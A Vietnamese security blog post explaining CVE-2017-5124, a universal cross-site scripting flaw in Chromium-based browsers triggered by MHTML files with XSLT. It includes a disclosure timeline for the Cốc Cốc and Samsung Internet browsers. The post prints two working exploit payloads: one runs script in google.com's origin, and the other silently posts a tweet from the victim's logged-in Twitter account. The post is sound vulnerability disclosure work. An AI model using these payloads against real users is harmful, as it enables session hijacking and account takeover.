---
layout: post
title: "Chromium Based Browsers are safe or not ? "
date: 2017-12-17 00:00:00.000000000 +07:00
type: post
published: true
status: publish
categories:
- Tutorials
tags:
- uxss
- chromium
excerpt: "Gần đây, trình duyệt nguồn mở Chromium (phiên bản 62 trở xuống) có một lỗi cực kì nghiêm trọng. Vậy lỗi này nghiêm trọng thế nào? Ảnh hưởng của lỗi này ra sao?"
---

Gần đây, trình duyệt nguồn mở Chromium (phiên bản 62 trở xuống) có một lỗi cực kì nghiêm trọng **UXSS with MHTML**, được gắn mã CVE-2017-5124. Mã khai thác của lỗi này cũng đã được công bố: https://github.com/Bo0oM/CVE-2017-5124. Vậy lỗi này nghiêm trọng thế nào? Ảnh hưởng của lỗi này ra sao? 

## Universal Cross-site Scripting (UXSS) là gì?
Lỗi [cross-site scripting (XSS) attacks](https://www.acunetix.com/websitesecurity/cross-site-scripting/) thường xuất hiện trên các website hoặc các ứng dụng web. Đây là lỗ hổng cho phép hacker có thể chèn những đoạn mã client-script (thường là Javascript hoặc HTML) vào trang web, khi người dùng vào những trên web này, mã độc sẽ được thực thi trên máy của người dùng. UXSS giống với XSS  ở một số đặc điểm cơ bản: khai thác một lỗ hổng của ứng dụng web, thực thi mã độc, tuy nhiên vẫn có điểm khác nhau như sau: không giống như XSS là lỗ hổng nằm bên trong ứng dụng web, UXSS là loại lỗ hổng nằm bên trong trình duyệt, hoặc một phần mở rộng của trình duyệt. Loại lỗ hổng này tạo ra điều kiện giống như điều kiện xảy ra XSS, do đó có thể thực thi code độc hại. Khi lỗ hổng này bị khai thác, các tính năng bảo mật của trình duyệt sẽ bị vô hiệu hóa.

Hacker sử dụng UXSS để truy cập vào mọi phiên đang mở của trình duyệt: hacker có thể đọc được cookie hoặc session của các tab đang mở.

## UXSS with MHTML (CVE-2017-5124)
Đây là một lỗi nằm trong nhân xử lý của Chromium khi xử lý định dạng [MHTML (MIME-HTML)](https://en.wikipedia.org/wiki/MHTML) .

MHTML là tài liệu văn bản mà trong đó xác định rõ tiêu đề (title), content-type (`multipart / related`) và phần biên (ví dụ là `----MultipartBoundary--`), sau đó được chia thành từng phần trong một file. Ngoài ra, có thể bổ sung một số thông tin như cách encode(base64 chẳng hạn).

Trong mô tả của html, chúng ta có thể sử dụng Content-location để xác định nguồn của dữ liệu. Ví dụ, chúng ta viết Content-location: https://example.com/abc, dữ liệu sẽ được trình duyệt đọc từ địa chỉ https://example.com/abc và hiển thị.

Để an toàn cho người dùng, tất cả các dữ liệu liên quan tới javascript đều bị cấm và không thể tải được từ một địa chỉ khác, ngoài domain người dùng đang truy cập. Điều này được Chromium kiểm tra ở mọi chỗ, trừ [XSLT](https://en.wikipedia.org/wiki/XSLT).

```
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--"
CVE-2017-5124

------MultipartBoundary--
Content-Type: application/xml;

<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE catalog [
<!ATTLIST xsl:stylesheet
id ID #REQUIRED>
]>
<xsl:stylesheet id="stylesheet" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="*">
<html><iframe style="display:none" src="https://google.com"></iframe></html>
</xsl:template>
</xsl:stylesheet>

------MultipartBoundary--
Content-Type: text/html
Content-Location: https://google.com

<script>alert('Location origin: '+location.origin)</script>
------MultipartBoundary----
```

Trong đoạn mã trên, hacker có thể chạy alert() với domain https://google.com và hiển thị một messagebox cho biết location tương ứng với ngữ cảnh script đang chạy.

## Một vài kịch bản khai thác sử dụng UXSS with MHTML (CVE-2017-5124)
Nếu đơn thuần chỉ hiển thị một messagebox thì có lẽ cũng không cần quan tâm. Chúng ta sẽ tiếp cận một vài kịch bản "thực tế" hơn:
 * Người dùng bị mất email: Người dùng hoàn toàn có thể bị kẻ xấu lợi dụng để đọc email, gửi thư bằng địa chỉ email của người dùng mà họ không hề hay biết. Hiện giờ, các tài khoản ngân hàng, tài khoản mạng xã hội thường gắn liền với một địa chỉ email. Nếu chiếm được email này, hacker hoàn toàn có thể đọc được các mã recover tài khoản hoặc các thông báo từ phía ngân hàng, gửi email giả mạo hoặc sử dụng email này làm bàn đạp để tấn công.
 * Người dùng hoàn toàn có thể bị chiếm quyền điều khiển các tài khoản mạng xã hội: Hacker có thể đọc và đăng các bài post dưới tài khoản của người dùng. Tôi sẽ sử dụng tài khoản Twitter của tôi để thử nghiệm.
 * Người dùng có thể mất tài khoản ngân hàng: nếu người dùng chỉ sử dụng trình duyệt và không có phương thức bảo vệ nào khác như OTP.
 
Mã khai thác sẽ tweet một thông điệp bằng tài khoản Twitter của người dùng.
```
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--"
Become IDOL

------MultipartBoundary--
Content-Type: application/xml;

<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE catalog [
<!ATTLIST xsl:stylesheet
id ID #REQUIRED>
]>
<xsl:stylesheet id="stylesheet" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="*">
<html><iframe style="display:none" src="https://twitter.com" ></iframe></html>
</xsl:template>
</xsl:stylesheet>

------MultipartBoundary--
Content-Type: text/html
Content-Location: https://twitter.com

<script>

function tweet(text)
{
    var win = window.open("/", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=2, height=1, visible=none', '');
	win.onload = function(){
	        win.boxTextToTweet = win.document.getElementById("tweet-box-home-timeline");
			win.btnPostTweet = win.document.getElementsByClassName("tweet-action EdgeButton EdgeButton--primary js-tweet-btn")[0];
			win.boxTextToTweet.focus();
			win.boxTextToTweet.innerHTML = text;
			setTimeout(function(){ win.btnPostTweet.click(); }, 500);
			setTimeout(function(){ win.close(); }, 1500);
	}
}

tweet('I <3 fosec. @quangnh89 is my idol.');

</script>
------MultipartBoundary----
```

Tôi có thực hiện một vài kịch bản tấn công với 2 trình duyệt Cốc Cốc ( bản 66 ) và SamSung Internet.

Demo với Cốc Cốc 66:

[![UXSS with MHTML (CVE-2017-5124) + CocCoc browser 66.4.134](https://img.youtube.com/vi/oBZe2-dtfGI/0.jpg)](https://www.youtube.com/watch?v=oBZe2-dtfGI)

## Những trình duyệt bị ảnh hưởng bởi CVE-2017-5124
Tôi khẳng định: Tất cả các trình duyệt sử dụng nhân của Chromium (phiên bản nhỏ hơn 62) đều bị ảnh hưởng. Điểm qua một số trình duyệt đang thịnh hành ở Việt Nam, chúng ta có thể kể đến Cốc Cốc (coccoc.vn), phiên bản 66.4.134 đang dùng nhân Chromium 60.4.3112.134). Ngoài ra một số trình duyệt trên các dòng điện thoại SamSung do hãng sản xuất tự thêm vào đều có thể mắc phải lỗi này. Cá nhân tôi cho rẳng, để an toàn, chúng ta có thể tạm thời ngưng sử dụng trình duyệt có lỗi cho đến khi chúng có bản vá đầy đủ.

## Timeline thông báo lỗi tới các bên liên quan
_Trình duyệt Cốc Cốc_
 * 05/12/2017: Thông báo cho công ty Cốc Cốc.
 * 06/12/2017: Công ty Cốc Cốc khẳng định sẽ release bản sửa lỗi khi cập nhật tới phiên bản 68.
 * 17/12/2017: Kiểm tra trình duyệt Cốc Cốc 68 và lỗi đã fix xong.
Hiện tại, bản mới nhất của Cốc Cốc đã sửa lỗi này. Nếu bạn dùng Cốc Cốc, hãy tải bản mới nhất.

_Trình duyệt SamSung Internet Browser 6.2.01.12_
 * 03/12/2017: Thông báo cho Công ty SamSung
 * 04/12/2017: SamSung thông báo đã tiếp nhận vấn đề
 * 08/12/2017: SamSung cho rằng issue này thuộc về Google Chrome và đã fix và đóng issue.
 
Theo thử nghiệm của tôi, trình duyệt SamSung Internet Browser 6.2.01.12 bị lỗ hổng nghiêm trọng này. Nếu máy điện thoại của bạn chưa cập nhật lên bản mới hơn, hãy tạm dừng sử dụng nó cho đến khi có bản mới. Demo với SamSung internet: https://www.youtube.com/watch?v=nLPuplN5HmM